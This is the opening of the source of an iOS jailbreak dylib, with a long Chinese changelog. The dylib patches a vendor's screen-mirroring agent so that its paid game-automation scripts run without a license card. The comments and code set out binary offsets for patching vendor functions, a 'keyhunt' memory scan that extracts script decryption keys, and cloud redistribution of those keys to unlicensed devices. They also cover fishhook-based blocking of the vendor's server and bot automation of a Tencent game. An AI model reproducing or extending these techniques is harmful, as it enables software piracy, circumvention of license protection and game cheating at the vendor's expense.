//       ③ [cr] 停摆/空闲兜底自动 OPER_START 删除 —— 只留 5 分钟诊断快照；
//       ④ [cr] cr_pending 重试状态机（含会话死冷启 App 升级）整块删除；
//       ⑤ [rl] so_sync 自动重载加守卫 —— 脚本没在跑（run==0）时不下发 START，
//          新 so 留盘上，下次手动运行自然加载；脚本在跑才允许 STOP→START 换包。
//       保留：崩溃签名扫描与 .bs_cr_pending 证据落盘（纯观察）、[cr] stall scan 诊断
//       快照、用户停止闸门 .bs_userstop（继续压制 [rl]）、[fg] 前台看门狗（只拉游戏
//       回前台，不碰脚本）、crashresume conf 键仍解析但不再有任何动作点。
//
// v6.24o ★★★ `crashresume=0` 真正接线（2026-10-20，用户要求撤销 func-nil 静默化）：
//       背景：`g_crashresume` 自 v6.17 起只被解析、从未被任何判断使用 —— 是死配置。
//             撤销 beta.so 硬化后，func-nil 崩溃会重新出现（这是用户要的「可见」），
//             但若 [cr] 15s 内自动拉起，中控只闪一下、人还是看不见。
//       修法：把 g_crashresume 接进全部 5 个自动拉起入口 ——
//             ① 崩溃签名动作闸门 gate_ok；② 加载失败挂 pending；
//             ③ 停摆/空闲兜底；④ [hg] 假运行看门狗；⑤ cr_pending 重试状态机。
//       效果：conf 写 `crashresume=0` → 设备崩溃后**原地停住**，日志留
//             `[cr] ★ crash CONFIRMED ... kept STOPPED on purpose, press Run in center`，
//             中控显示未运行，人工点「运行」即恢复（点起来后 pending 自行清）。
//             诊断行新增 `ar=` 字段。默认仍为 1（自动恢复），不影响存量设备。
//
// v6.24n ★ 判据放宽：不要求 st!=0（卡死时容器指针可能已被清 0，run 仍为 1）。
//
// v6.24m ★★★ 「中控显示运行中、实际脚本不动」根治（2026-10-20，.2080 设备 c42a8474… 实锤）：
//       现象：设备 run=1、agent 心跳 2min 一拍正常，中控显示脚本在跑，但游戏画面不动 6 小时。
//       证据：sjz.log 最后一行 02:20:18 `[长弓溪谷] find pickup icon first` 之后再无输出；
//             sreen.log（截图/投屏通道）从 02:25:51 起只剩 "socket no data recv:1,35"；
//             agent.log 无 `run script error`，run 标志始终 1。
//       结论：脚本线程卡在截图/找图调用上无限等待 —— 不是崩溃（[cr] 看不见），
//             也不是停脚本（run 不为 0，idle 兜底看不见），两套自愈全部失明。
//       修法：新增 [hg] 假运行看门狗 —— run==1 && st!=0 && sjz 停写 ≥900s 且无用户停止闸门
//             → OPER_STOP（打断卡死线程）→ 1.5s → OPER_START，并接管 cr_pending 继续重试；
//             两次之间 1800s 冷却；期间用 hg_busy_until 屏蔽 `run 1->0` 误落用户停止闸门。
//
// v6.24l ★ 闸门判据收紧（同日，.216 装 1.64 后 15 分钟实测驱动）：
//       ① `begin process operate script msg` 撤出停止判据 —— 它是中控「操作消息」的
//          统一入口（点运行同样走它），拿它判停止一旦厂商改用它下发运行就会反锁。
//          改只认 `agent stop script` / `begin process stop script msg`。
//       ② marker 写入加「sjz 新鲜度 ≤300s」前提 —— App 冷启时厂商 run 标志残留为 1、
//          初始化后掉 0 也会构成 1->0 假信号，老写法会误落闸门 → 装完包静默躺平。
//       实测（21:01 .216）：装 1.64 后 `[cr] stall scan ... us=1` —— 闸门按「用户 20:53
//       确实点过停止」正确生效，脚本没有被兜底拉起（这正是要的行为）。
//
// v6.24k ★★★ 「中控停脚本又被自动拉起」根治（2026-10-19，.216 实锤，deb ≥1.60）：
//       现象：中控点「停止」→ 20:53:00 agent stop script → 20:53:29 dylib 自己发
//             OPER_START → 20:53:36 用户再点停止。停止事件被反复对抗。
//       根因（两条叠加，缺一不成立）：
//             ① `bs_last_stop_is_user` 判据串写错：写的是
//                "begin process stop script msg"，而厂商真实日志是
//                "begin process operate script msg!"。设备实查：错误串 0 次、
//                正确串 4 次 → 该函数**恒返回 0**，用户停止永远识别不出来。
//             ② 判据只作用于 idle 分支，`stalled` 分支（marker / run-error 证据）
//                完全不看用户停止；且窗口只有 64KB，agent.log 每 20s 写 3 行，
//                半小时后停止痕迹早被挤出窗口。
//             → 于是 idle 兜底（CR_IDLE_SECS=600）在停止后第一拍扫描就直接拉起。
//       修法：
//             (a) 新增**落盘闸门** `.bs_userstop`：观测到 run 1->0（非 reload、
//                 非卡封禁）立即写；App 重启 / 日志轮转都不影响。
//             (b) 闸门存在期间禁止**一切**自动拉起：idle 兜底、stalled 兜底、
//                 崩溃重试状态机、so_sync 自动 reload。[fg] 本就要 run=1，天然不触发。
//             (c) 解除只有一个条件：再次看到 run==1（= 中控真的下发了「运行」）。
//             (d) 优先级：崩溃证据 > 用户停止。扫到 run-error / loadfail 签名时
//                 撤销闸门走恢复（那是「中控下发的 run 执行后崩了」，不是人工停）。
//             (e) 停止判据串修正为 operate/stop/agent-stop 三种，窗口 64K→256K。
//       配套：给 `[cr] stall scan` 诊断行加 us= 字段，现场一眼看出是否被闸门挡住。
//
// v6.24j ★★ 「装完不代启」三处盲区（2026-10-19，.98 装 probe 包实锤）：
//       现象：.98 装 v1.60-probe 后 App 确实冷启了，但日志**一条 [autosvc] 都没有**，
//             服务没被点起来（.216 那种「[autosvc] no marker / tapped OK」也没有）。
//       根因（三条都成立，缺一即失效）：
//             ① **dylib 不重新 load**：dyld 共享缓存已映射的同路径 dylib，装完覆盖文件后
//                新进程仍用旧缓存映射 → +load/constructor **根本不跑**，所以连日志都没有；
//                原本靠「装包→killall App→uiopen」触发重新映射，但若 App 启动太快 / 系统
//                把它留在后台，就不成立。
//             ② **UI 未就绪**：os_kickoff 立刻起 2s 拍定时器，冷启时 UIWindow 可能还没建，
//                命中判定永远拿 nil；60 拍（2min）耗尽后放弃，标记留着等下次 —— 但下次
//                又是同一时序，容易永远点不到。
//             ③ **只在进程启动那一刻看标记**：装包时 App 已在后台（未被 kill 或被杀后
//                被系统恢复），再切回前台也不会重查标记。
//       修法（都在 App 进程内，probe/unlock 通用）：
//             (a) bootstrap 里先**轮询等 UI 就绪**（最多 60s，1.5s 一拍）再 kickoff；
//             (b) 订阅 `UIApplicationDidBecomeActiveNotification` —— 每次激活都重查
//                 `.autosvc_pending`，有就再 kickoff（消费后自动 no-op）；后台线程注册，
//                 不碰冷启动期 dyld/ObjC；
//             (c) as_tick 每拍先查标记是否还在（被别的 kickoff 消费则收尾），
//                 g_as_busy 防重复 kickoff 起两套定时器。
//       配套（本轮已做）：probe 包 postinst **补写** `.autosvc_pending`（原来只有 unlock
//       写）；装包后务必 killall App + uiopen 冷启一次，否则 ① 无法绕过。
//
// v6.23n ★★ 脏容器自愈（2026-10-05，外网机 nm=1005「加载运行库出错」实锤驱动）：
//       厂商通道会给 App 拉到捆了**无键远古段**的变体容器（12 段 7 无键，
//       md5 57076b29），App 加载运行库解密失败 →「加载运行库出错」。
//       云端 probe 分发的同版本号包是干净的（7 段全键），两包尺寸可能相同
//       → so_sync「只升不降」永远不触发，设备永久卡死。
//       修法：/ver 版本一致时也验容器健康 —— 逐段版本查键（字典已有零开销；
//       缺 → 云端 /key bypass 现查），确认「字典+云端都无键」的段存在 →
//       按当前版本号重拉干净包覆盖（键闸门 v6.18 同款，闸门不过不落盘），
//       修复冷却 1h 防打爆。特征串 "dirty container" / "container repaired"。
//
// v6.23o ★★ md5 强制比对自愈（2026-10-05 深夜，1005 修复后 2h 内再坏驱动）：
//       v6.23n 只能抓「无键段」型脏容器；实测厂商通道/App 会在同版本号下
//       整包换载荷（1005 20:21 人工覆盖干净包 → 22:47 又报 Lua '—' 编译错），
//       变体可以全键但内容坏，键体检永远过。云端 /ver 应答本就带 md5 字段
//       （script_latest 已算好）——版本一致时再比 bs_md5_file(本地 beta.so)：
//       不一致 = 本地被换包 → 直接按云端 md5 重拉（下载体 md5 也必须命中
//       才落盘，防中继缓存陈旧包来回打架），冷却沿用 1h。
//       特征串 "md5 mismatch" / "md5 verified"。
//
// v6.23p ★ dylib 版本号随心跳上报（2026-10-06 凌晨，舰队全量铺装驱动）：
//       devlog 回传后被服务端裁到尾部 8KB，启动期 [conf] 行十几分钟即滚掉
//       → 云端无法判断某台设备跑的是哪版 dylib（1005/8128 都识别不出）。
//       修法：#define BS_DYLIB_VER 版本常量，/hb（与 /manifest）query 追加
//       &dv=<ver>；服务端解析入库、设备表「型号/系统」列直接显示。心跳
//       ping 行每 tick 都带 dv=，8KB 尾部永远看得到 → 全量铺装装一台亮一台。
//
// v6.23q ★ keyhunt 进程内存密钥找回（2026-10-11 凌晨，030009 密钥断供驱动）：
//       厂商 3.0.9 起改密钥送达方式：脚本解密密钥不再进 _g_script_mushroom_head
//       字典 → probe 每拍 "not in dict yet"，云端 keys.json 永远等不到 030009
//       （.71 实测：sjz.log 横幅在跑 3.0.9、mh dict 仍 n=8）。但密钥在脚本
//       解密那一刻必经本进程内存 → probe 线程在字典缺失时扫全部可读内存，
//       用盘上 beta.so 的【ver==目标】type=1 段密文做 AES-256-ECB 试解：
//       粗筛 zlib 头 + 精验 libcompression 解压 == nl+cl 且 name 可打印。
//       命中注入 g_mh_snap 走常规 BSPR 上报 → 云端入库 → 全网跟版恢复。
//       纯 C AES 表运行期生成（FIPS-197 自检失败即禁用），零 CI 链接改动。
//       特征串 "keyhunt" / "FOUND ver="。
//
// v6.23s ★ 卡密「后输入者得」落地（2026-10-13 用户拍板，配套 bsmod v3.10）：
//       ① 激活请求（卡变更分支）body 加 "act":"new" —— 卡已被他机绑定时服务端
//          直接改绑（接管），原持有方下次心跳收 code=7；
//       ② code=7 处理：清 g_card_cur/expire/lastok + cache_save（bs_card.txt 卡号
//          清空）+ 本地拉黑该卡（g_card_kicked）——拉黑是防振荡关键：被踢设备
//          卡源（日志捕获/内存）会自动重灌同一张卡，若不拉黑将以 act=new 抢回
//          → 与接管方 60s 心跳互踢死循环；拉黑后静默停脚本等真输入（换卡或
//          重启 App 清拉黑）。心跳 code=7 同样拉黑（本机卡被别机接管场景）。
//       ③ 激活成功清拉黑。特征串 "taken over" / "act"。
//
// v6.23v ★ App 进程首启自动点「启动服务」（2026-10-14）：
//       需求（用户）：装完新 bspath 后模拟人工「打开 App → 点启动服务」，每次新版本只执行一次。
//       前提：filter plist 扩为 Agent+App 两个 Executable（原只注 Agent，App 进程 dylib 不加载）。
//       机制：
//             ① postinst 装 dylib 后写标记 $DATA/.autosvc_pending（内容=版本号），再冷启动 App；
//             ② App 进程内 bs_bootstrap 顶部判进程名（_NSGetExecutablePath）= App →
//               若标记存在 → performSelectorOnMainThread 起 NSTimer（2s 一拍，最多 20 拍）；
//             ③ 每拍递归扫 UIWindow 树找 title/accessibilityLabel 含「启动服务」的 UIButton，
//               命中即 sendActionsForControlEvents:UIControlEventTouchUpInside（等价真人手点，
//               走 App 自己的启动链路，会话协商天然齐全 —— v1.49 nohup 直拉 recv rep key failed 的根）；
//             ④ 点击成功 → 标记改名 .autosvc_done_<ts> → 本次安装生命周期内不再执行；
//               20 拍没找到（UI 慢/文案变了）→ 留标记，下次开 App 再试，最坏退化为手点。
//       App 进程内其余全跳过：bs_block_init 不装（constructor 判进程）、bs_find_base/注入/
//       心跳/pull 均不跑（Agent 专属），bs_log 打 [autosvc] 前缀进同一日志。
//
// v6.23u ★ crash-resume 签名放宽 + 扩扫 sjz.log + cardtick 300→120（2026-10-14）：
//       背景（用户报「部分机器跑着跑着停，中控显示 string"UNKONW = 0 IPHONE_8P = 1
//             ANDROID = 2 function.."]:1: attempt to call local func (a nil value)"）：
//             即 v6.17 处理过的 wait_call_func 4~5h 热更新崩溃，但部分机器仍漏拉。
//       三个缺口：
//             ① 签名只匹配带引号格式 `local 'func'` —— 中控显示为无引号 `local func`，
//               不同机型 lua/日志格式差异会漏匹配 → 双格式都收；
//             ② 只扫 agent.log —— 错误也可能落 sjz.log（脚本层日志）→ 两文件都做
//               增量扫描（基线各自独立，命中任一即走恢复判定）；
//             ③ 老版本 dylib（v6.17 之前）根本没有 crash-resume → 出 v1.51 deb
//               统一升级内嵌 v6.23u。
//       另：cardtick 缺省 300→120（v6.20 注释同改），code=7 被踢感知最长 5 分钟→2 分钟。
//
// v6.23t ★ 拉黑落盘 + 真输入判定（2026-10-13，堵重启抢回窗口）：
//       问题：v6.23s 的 g_card_kicked 只在内存 —— 被踢机重启后拉黑丢失，而
//       agent.log 尾部 64KB 扫描（无 offset）仍能抓到同一卡号 → 以 act=new 抢回
//       → 与接管方 60s 心跳互踢振荡。
//       修法：① bs_card.txt 追加 kicked= / kickts= 两行，随缓存落盘与读回；
//             ② 解除拉黑须「真重新输入」= 捕获到行首 [Y/M/D H:M:S] 时间戳
//                晚于 kickts 的激活日志行；旧日志残留时间戳必 ≤ kickts，不算。
//       效果：被踢机不换卡/不重新输卡 → 重启后依旧静默封禁，绝不抢回。
//       特征串 "kicked=" / "newer input seen after kick"。
//
// v6.23r ★ 修复 net block 快扫路径 bug（2026-10-11 深夜，.71 真卡卡大厅驱动）：
//       bs_block_init 快扫读的是 DATA_DIR/bs_pull.conf（App 数据目录，不存在）
//       → fp=NULL → bv 缺省 1 + mode 空 → probe 真卡机例外**从未生效**，
//       每次启动都装 block；Agent 长连接 22:12 断线重连时 DNS 被自己拦死
//       （vps.beibeiplay.com blocked），脚本失联卡大厅。改为先读 PULL_CONF
//       （Media 根真实 conf），读不到回落 DATA_DIR（兼容历史放置）。
//       特征串不变："blockvps=0 -> net block skipped"。
//
// v6.23o ★★ md5 强制比对自愈（2026-10-05 深夜，1005 修复后 2h 内再坏驱动）：
//       服务端零改动（/ver 的 md5 字段 v3.x 就有）。
//
////
// ── v3 闸门问题（已实证） ────────────────────────────────────────────
// _bb_load_script (vmaddr 0x10000c1bc) 入口：
//     0x10000c1f0  ldr  x8, [x26, #0x48]     ; g_lua_state @ 0x100053048
//     0x10000c1f4  cbz  x8, 0x10000c200      ; == 0 才继续加载
//     0x10000c1f8  mov  w22, #-1             ; != 0 直接 return -1，不打任何日志
// 脚本一旦加载过（state 非 0），再点中控「运行」就静默失败 —— 界面完全没反应。
// 看门狗策略：每 2s 采样，state != 0 且 _g_bb_script_run (0x100053095) == 0，
// 连续 5 次（10s）→ 判僵死 → 调 _set_user_script_operate(1)，交给产品自己收尾。
//
// ── v4 本地模块注入 ──────────────────────────────────────────────────
//     function wait_call_func(func, name, ...)
//         local status, ret1.. = pcall(func, ...)
//         if status then return ret1, ret2
//         else
//             while true do
//                 if waitCallModule(name) then
//                     func = load("return "..name)()
//                     return func(...)
//                 else mSleep(1000) end
//             end
//         end
//     end
// 下发落地函数（唯一写入点）：
//     _bb_I7FSMHXZCP(0x1000159e0) → _set_script_onion_data(0x100004914)
//     _set_script_onion_data(NSString *name, NSString *code)
//         → dict[0x1000532c0][name] = code        （NSMutableDictionary）
// ⇒ 我们把本地模块源码按同样方式塞进 dict，产品自己的流程就会加载它。
// ★ 实测（2026-09-26，.47）：字典的 value 类型是 NSData，不是 NSString。
//
// ── v5 路线 A（PC 拉取） ─────────────────────────────────────────────
// app.plist 路径（App 视角）：/var/mobile/Media/BetaScreenTYMDESUJCX8T/app.plist
//   内容： <?xml ...?><plist version="1.0"><dict><key>ip</key><string>192.69.0.24</string></dict></plist>
//   来源：App 里手输 → 写盘。官方 deb 的 preinst 会刻意保留它。
//   ⇒ 它就是「设备找 PC 中控」的天然入口，v5~v6.1 直接复用它。
//   ★★ v6.2 起本补丁**不再读它**（它归 App/中控，用户自己维护），
//      服务端地址改为内置 + conf 可选覆盖，详见 BS_HOST_DEF 注释。
//
// ── v6.3 密钥云端化（2026-09-28） ────────────────────────────────────
// 以前 kKey/kVal 是编译期硬编码（020909 + 32B 密钥）。脚本升到新版本后
// （如 3.0.0，版本键 = 030000），Agent 在 _g_script_mushroom_head 里查不到
// 对应版本 → "can not find version key!!" → 脚本挂；而免卡密机永远拿不到
// 卡密服务器下发的新密钥 → 过去只能改源码 + 重跑 CI + 重新部署 dylib。
//
// 现在：bootstrap 先 bs_load_conf()，再 bs_inject_mh()：
//   1) 读本地 beta.so 头 4 字节 → 版本 hex（02 09 09 -> "020909"）
//   2) GET /key?prj=sjz&ver=<hex>[&key=<设备码>] → 35B（3B 版本号 + 32B 密钥）
//   3) 注入 _g_script_mushroom_head；失败才回退内置 kKey/kVal
// ⇒ 脚本升级后**无需重编译 dylib**，只要云端密钥库有该版本即可。
//   云端密钥来源：真卡机 dump（_patched/dump_mhkey.py、
//   _patched/watch_upgrade.py 会自动检测版本变化并上架）。
//
// 编译（macOS + Xcode CLI）
// ------------------------
//   xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -O2 -miphoneos-version-min=13.0 \
//     -framework Foundation -install_name @rpath/bs_unlock.dylib -o bs_unlock.dylib bs_unlock.m

#import <Foundation/Foundation.h>
#import <mach-o/dyld.h>
#import <pthread.h>
#import <objc/runtime.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>       // ★ v6.3：bs_read_beta_ver 的 errno 诊断
#include <sys/mman.h>    // ★ v6.23：mprotect（运行时中和厂商 valid_time setter）
#include <spawn.h>       // ★ v6.24d：冷启 App / uiopen 用 posix_spawn（rootless 无 /bin/sh，system() 不可用）
#include <signal.h>      // ★ v6.24d：posix_spawnattr sigmask
extern char **environ;   // ★ v6.24d：posix_spawn envp
#include <mach/mach.h>   // ★ v6.23b：mach_task_self + vm_allocate/vm_remap/vm_deallocate
// ★ v6.23q：iOS SDK 不提供 <mach/mach_vm.h>（头里直接 #error），但符号在
//   libsystem_kernel 里齐全 —— 手动 extern 声明即可（keyhunt 扫内存用）。
extern kern_return_t mach_vm_region(vm_map_t target_task,
                                    mach_vm_address_t *address,
                                    mach_vm_size_t *size,
                                    vm_region_flavor_t flavor,
                                    vm_region_info_t info,
                                    mach_msg_type_number_t *infoCnt,
                                    mach_port_t *object_name);
extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task,
                                            mach_vm_address_t address,
                                            mach_vm_size_t size,
                                            mach_vm_address_t data,
                                            mach_vm_size_t *outsize);
// ★ iOS SDK 不允许 mach_vm.h（"mach_vm.h unsupported"）→ 用 legacy vm_* 系列
//（vm_address_t 在 arm64 上就是 64 位，行为等价，ellekit 设备侧同款用法）
#include <mach/vm_statistics.h> // ★ v6.23b：VM_FLAGS_ANYWHERE / VM_FLAGS_OVERWRITE
#include <mach/vm_inherit.h>    // ★ v6.23b：VM_INHERIT_COPY
#include <libkern/OSCacheControl.h> // ★ v6.23：sys_icache_invalidate
#include <dirent.h>      // ★ v6：扫模块目录（抹除 .lua）
#include <sys/sysctl.h>  // ★ v6.10：设备名/型号/系统版本上报
#include <dlfcn.h>       // ★ v6.20：dlsym 解析 Agent 卡密 getter
#include <sys/socket.h>  // ★ v6.19：厂商服务器进程内屏蔽
#include <netinet/in.h>  // ★ v6.19
#include <arpa/inet.h>   // ★ v6.19：inet_addr/ntohs
#include <netdb.h>       // ★ v6.19：getaddrinfo/EAI_NONAME
#import "fishhook.h"     // ★ v6.19：facebook fishhook（rebind_symbols）

#define AGENT_NAME "BetaScreenTYMDESUJCX8TAgent"

// ---- 全局偏移（vmaddr - __TEXT(0x100000000)）
#define OFF_MH        0x53020   // _g_script_mushroom_head (NSDictionary*)
#define OFF_STATE     0x53048   // _g_lua_state (lua_State*)，加载闸门
#define OFF_RUN       0x53095   // _g_bb_script_run (u8: 1 = 脚本运行中)
#define OFF_ONION_DICT 0x532c0  // onion 模块字典 (NSMutableDictionary*: name -> code)
#define OFF_RS_1A8    0x531a8   // 脚本状态码 (int32)

#define FN_SET_OPER   0xd8a0    // void _set_user_script_operate(int)
#define FN_SET_ONION  0x4914    // void _set_script_onion_data(NSString *name, NSString *code)

// 0 = 启动  1 = 停止  4 = 重启
#define OPER_START     0    // ★ v6.7：启动（等价于「点运行」）
#define OPER_STOP     1
#define OPER_RESTART   4    // ★ v6.7：产品「重启」语义（反汇编推断，未实测；本版未采用）

#define WD_TICK_SECS    2
#define WD_STALE_TICKS  5       // 5 * 2s = 10s 判定僵死

// ★ v6.7：落盘后自动重启的状态机相位与超时上限 —— ★ v6.24q 已随 [rl] 整体移除
//   （新 so 只落盘，脚本手动运行时加载；conf autoreload= 键仍解析但无动作点）

// ★ v6.17：func-nil 崩溃自动恢复（crash-resume）—— ★ v6.24p 已按用户指令移除全部
//   自动恢复动作，仅保留签名扫描做证据落盘与诊断日志（见下）。
// ★ v6.24c：加载期失败也纳入自愈 —— 签名扩到 `can not find version key` /
//   `load snail module failed`（10-17 .115 装 v1.56 后冷启：「加载运行库出错」）。
//   该类失败发生在「中控上线 4s 就补发 run、而 dylib 还没铺完全部段版本键」的
//   窗口内（实测键 17:45:19.7 才齐，加载 17:45:18 已失败），键齐后重试必成。
//   同时把 init 阶段改成「同步预铺全部版本键」（见 bootstrap 1a-2），把窗口压到 ~1s。
//   闸门对 loadfail 不要求 saw_run（run 可能已回落而 saw_run 尚未置位）。
// ★ v6.24b/d：崩溃恢复「重试状态机 + 会话死升级冷启 App」—— ★ v6.24p 已整块删除。
#define FG_STALE_SECS   180     // ★ v6.24d：sjz.log 停摆判定（秒）
#define FG_MIN          600     // ★ v6.24d：[fg] uiopen 游戏限速（秒）
#define CR_STALL_SCAN   60      // ★ v6.24p：停摆扫描周期（秒）——现仅用于诊断快照
#define FG_GAME_BID     "com.tencent.tmgp.dfm"   // ★ v6.24d：三角洲行动（DeltaForceClient.app）

// ★ v6.8：大文件（beta.so ~1.16MB，上限 8MB）下载专用长超时。
//   弱网实证（2026-09-28，111.172.x 两台）：共用 6s/8s 超时 → 每次下载 8s 被掐、
//   0 字节到手（NSURLErrorTimedOut=-1001）→ bad size 0 abort，永不落盘。
//   request 超时 = 无数据空闲上限（有数据流动就续命）；resource = 整请求总预算。
#define SO_DL_TMO_REQ   60      // 空闲 60s（正常传输会不断重置）
#define SO_PORT_DEF     27391   // ★ v6.12：中继（BSModuleServer）默认端口，conf 无 soport 时用
#define SO_DL_TMO_RES   300     // 总预算 5 分钟（8MB @ ~27KB/s 也够）

#define MOD_DIR_DEF "/var/mobile/Media/bs_modules"
#define DATA_DIR  "/var/mobile/Media/BetaScreenTYMDESUJCX8T"

// bs_log 的落盘路径（纯 POSIX 写，禁 ObjC；理由见 bs_log 注释）
// 注意：dylib 跑在 Agent 进程内，此处 /var/mobile/Media 即 Dopamine jbroot 下的
// 真实 Media（shell 侧要加 /var/lib/.jbroot/rootfs 前缀才看得到同一个目录）。
#define BS_LOG_PATH "/var/mobile/Media/bs_unlock.log"

// ★ v6.24r：独立事件日志 —— `[us]` / `[cr]` / `[so]` / `[wd]` 这些「决策级」事件
//   单独写一份、单独走 &src=evt 上报通道。动机（10-20 三台实锤）：
//   主日志被 `[pull] step1~5` + `recv rep key failed` 高频淹没，8KB 窗口只剩 6~12 分钟，
//   崩溃/停止现场 10 分钟内就被冲干净，远程永远只能看到「停了」，看不到「为什么停」。
//   本文件只记关键事件、增长极慢（几十条/天），8KB 能覆盖数周。
#define BS_EVT_PATH "/var/mobile/Media/bs_evt.log"

// ★ v6.24r：运行库（beta.so）生效状态 —— 解决「落盘 ≠ 生效」无法远程判读。
//   格式一行：md5=<32hex> size=<n> disk=<epoch> pend=<0|1> applied=<epoch>
//   pend=1：新 so 已落盘但脚本还在跑内存里的旧 so（下次手动运行才生效）。
//   watchdog 观察到 run 0->1 时把 pend 清 0 并写 applied。
#define BS_SO_STATE_PATH DATA_DIR "/.bs_so_state"

// ---- v5：路线 A（PC 拉取）
#define PULL_TICK_SECS   300    // 每 5 分钟检查一次更新
#define PULL_FIRST_DELAY 3      // 启动 3s 后第一次拉（调试期缩短，便于快速观察）
#define PULL_TIMEOUT     6      // 单请求超时（秒）
#define PULL_PORT_DEF    8080   // PC 端 bs-module-server 默认端口
// 可选：与 PC 端 --token 对应。留空则不鉴权。
// 也可在设备上写 /var/mobile/Media/bs_pull.conf 覆盖（见下）。
#define PULL_TOKEN_DEF   ""

// ---- v6.2：服务端地址**内置**，不再读 app.plist
//
//   ★★ 重要（2026-09-27 现场教训）：
//   `/var/mobile/Media/BetaScreenTYMDESUJCX8T/app.plist` 里的 `ip` 是
//   **贝塔投屏 App 自己连「电脑中控」用的**（用户在 App 里手填的 PC IP），
//   跟 bspath 补丁**不是一回事**。v6.1 及以前 dylib 直接抠这个 ip 当服务端地址，
//   于是「中控 IP」和「模块/心跳服务端 IP」被绑死在同一份文件上——
//   服务端迁到公网后二者必然冲突（改一个就弄坏另一个）。
//
//   → v6.2 起：默认直连 BS_HOST_DEF（公网模块服务端），**完全不碰 app.plist**。
//     需要临时换服务端时，在 bs_pull.conf 写 `host=1.2.3.4` 即可覆盖（无需重编译）。
#define BS_HOST_DEF "47.116.161.226"   // ★ v6.16：云端迁移（老 47.243.156.129 弃用）

// ★ v6.3：脚本项目名（beta.so 记录 0 里的 prj_name），云端 /key 查密钥用。
//   只有换脚本项目（sjz 之外）才需改这里；版本升级不需要。
#define BS_PRJ "sjz"

// ---- v6：心跳授权（"心跳即死亡"）。
//   BSModuleServer 每次 pull 时用 /hb 端点返回授权；连续拿不到 -> 判定失联 ->
//   执行 OPER_STOP 停脚本 + 抹掉本地模块，使脱离 PC 服务的环境完全不可用。
//
//   ★ v6.1：网络类失败计数容忍（`hbmiss=` 可运行时覆盖），
//     授权类拒绝（403 / "ok":false）仍**立即**判死，不走计数。
#define HB_MISS_MAX_DEF  3      // 默认连续失败 N 次判失联（N * tick 秒）
#define HB_PATH          "/hb"

// ★★★ v6.4：probe 模式（真卡机「密钥 / 版本雷达」）。
//
//   背景：真卡机（有卡密、能正常与卡密服务器握手）升级脚本后，云端密钥库需要
//   第一时间拿到新版本密钥，否则免卡密机一旦跟着升级就会 `can not find version key!!`。
//
//   做法：真卡机也装本 dylib，但 conf 写 `mode=probe`，此时：
//     ① 不注入密钥（App 自己会从卡密服务器拿，注入反而多此一举）
//     ② 不起心跳 watchdog（不参与我们的授权，避免真机被云端策略误伤）
//     ③ 不 pull 模块（不动真机业务）
//     ④ 不打任何 Agent 补丁（deb --mode probe 会跳过五点补丁）
//   只做一件事：发现本地 beta.so 版本变化后，把「该版本解密密钥 + beta.so 包」
//   POST 到云端 /probe，供免卡密机 GET /key 与 /script/beta.so 自动取用。
//
//   ⇒ 真卡机行为零改变，只多一个只读线程 + 偶发上行流量。
#define PROBE_PATH       "/probe"
#define PROBE_TICK_SECS  600    // 复查间隔（已上报成功则静默等待）
// ★ v6.5：版本哨兵间隔。官方下包后约 12s 就重载脚本，puller tick(300s) 来不及补键，
//   所以单独用 3s 的高频纯 C 探测（只读 4 字节，开销可忽略）。
#define VERWATCH_TICK_SECS 3
// ★ v6.5：新版本密钥云端还没上架时的重试节流（N 个 tick 试一次；10 * 3s = 30s）。
#define VERWATCH_RETRY_EVERY 10
#define MODE_UNLOCK      0
#define MODE_PROBE       1
#define MH_SNAP_MAX      12     // 密钥字典快照最多记 8 个版本（v6.23q 起留余量给 keyhunt 注入）

// ★ v6.6：主动跟版（免卡密机从我们云端取脚本包本体）
#define SO_VER_PATH        "/ver"        // 云端最新版本查询（只元数据）

// ★ v6.23q：dylib 版本常量 —— 随 /hb 的 &dv= 上报云端（版本历史见文件头注释）
#define BS_DYLIB_VER       "v6.24r"
#define SO_SYNC_TICK_SECS  120           // 默认复查间隔
#define SO_SYNC_MIN_TICK   30            // conf sotick= 下限
#define SO_SYNC_MAX_TICK   3600          // 上限
#define SO_SYNC_FIRST_DELAY 20           // 启动后首轮延迟（等 App 网络栈就绪）
#define SO_MIN_BYTES       (600 * 1024)  // 合法 beta.so 体积下限（实际 1.1MB 量级）
#define SO_MAX_BYTES       (8 * 1024 * 1024)   // 上限（与服务端 probe 同口径）

// ★ 运行时配置：PULL_CONF（键=值，一行一个，可缺省）
//     port=18083
//     token=mysecret
//     tick=300
//     enable=1
//     mode=probe                         ← ★ v6.4 真卡机只读雷达
//     moddir=/var/mobile/Media/<自定义>   ← 模块目录可换隐秘路径
//     sosync=1                           ← ★ v6.6 主动跟版开关（0 关）
//     sotick=120                         ← ★ v6.6 跟版复查间隔（30..3600）
//     autoreload=1                       ← ★ v6.7 落盘后自动重启（0 关；仅在脚本运行中才重启）
//     crashresume=1                      ← ★ v6.17 func-nil 崩溃自动拉起（0 关）
//     blockvps=1                         ← ★ v6.19 屏蔽厂商 vps.beibeiplay.com/43.154.19.236（0 关；仅 unlock 生效）
//     cardcheck=1                        ← ★ v6.20 自有卡密系统（0 关；缺省开，仅 unlock 起卡密线程）
//     cardgrace=72                       ← ★ v6.20 网络失败宽限小时数
//     cardtick=120                       ← ★ v6.23u login 心跳间隔秒（原 300）
//     sohost=192.69.0.24                 ← ★ v6.9 局域网中继（仅 beta.so 下载走它；空=直连云端）
//     soport=27391                       ← ★ v6.9 中继端口（sohost 为空时忽略）
//   存在则覆盖上面编译期默认值 → 换端口/开关不必重新编译 dylib。
#define PULL_CONF "/var/mobile/Media/bs_pull.conf"

static void bs_log(const char *fmt, ...);

static int    g_port  = PULL_PORT_DEF;
static int    g_tick  = PULL_TICK_SECS;
static char   g_token[128] = PULL_TOKEN_DEF;
static int    g_enable = 1;

// ★ v6.2：服务端地址（默认 BS_HOST_DEF，可被 conf 的 host= 覆盖）
static char   g_host[128] = BS_HOST_DEF;

// ★ v6.9：局域网中继（仅 beta.so 下载走它；/hb /key /ver /probe /modules 仍直连 g_host）
// ★ v6.12：中继地址 = app.plist 的中控 ip（中控 PC 即中继 PC，同一台机器，用户在 App 里填好即可）。
//   conf 的 sohost 仅作应急覆盖（正常部署不需要填）；app.plist 缺失/为空 → 直连云端。
static char   g_sohost[128] = "";
static int    g_soport = 0;
static char   g_appip[64] = "";     // app.plist 抠出的中控 ip（conf 加载时缓存）

